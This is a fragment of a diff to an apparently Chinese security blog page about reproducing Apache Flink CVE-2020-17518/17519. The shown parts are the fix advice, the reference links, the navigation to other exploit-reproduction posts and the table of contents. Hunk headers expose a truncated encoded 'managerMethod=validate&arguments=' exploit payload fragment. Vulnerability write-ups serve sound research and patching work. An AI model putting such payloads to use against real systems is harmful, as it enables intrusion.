+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>官方已发布安全版本，请及时下载升级至安全版本<br><a target="_blank" rel="noopener" href="https://flink.apache.org/zh/downloads.html">https://flink.apache.org/zh/downloads.html</a></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://www.lele8.me/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://www.lele8.me/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/112792615">https://blog.csdn.net/qq_38154820/article/details/112792615</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/khz521/p/14023011.html">https://www.cnblogs.com/khz521/p/14023011.html</a></p>
 
     </div>
 
@@ -325,12 +349,12 @@ managerMethod&#x3D;validate&amp;arguments&#x3D;%1F%C2%8B%08%00%00%00%00%00%00%00
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/01/22/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="【MS17-010】永恒之蓝漏洞复现">
-      <i class="fa fa-chevron-left"></i> 【MS17-010】永恒之蓝漏洞复现
+    <a href="/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/" rel="prev" title="1039家校通SQL注入和后台GETSHELL">
+      <i class="fa fa-chevron-left"></i> 1039家校通SQL注入和后台GETSHELL
     </a></div>
       <div class="post-nav-item">
-    <a href="/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/" rel="next" title="1039家校通SQL注入和后台GETSHELL">
-      1039家校通SQL注入和后台GETSHELL <i class="fa fa-chevron-right"></i>
+    <a href="/2021/03/18/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="next" title="【CVE-2021-23132】Joomla!目录遍历及远程代码执行漏洞复现">
+      【CVE-2021-23132】Joomla!目录遍历及远程代码执行漏洞复现 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -390,7 +414,7 @@ managerMethod&#x3D;validate&amp;arguments&#x3D;%1F%C2%8B%08%00%00%00%00%00%00%00
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">2.</span> <span class="nav-text">漏洞影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#FOFA"><span class="nav-number">1.</span> <span class="nav-text">FOFA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">2.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">3.</span> <span class="nav-text">漏洞影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">4.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">5.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2020-17518"><span class="nav-number">5.1.</span> <span class="nav-text">CVE-2020-17518</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2020-17519"><span class="nav-number">5.2.</span> <span class="nav-text">CVE-2020-17519</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">6.</span> <span class="nav-text">漏洞修复</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">7.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
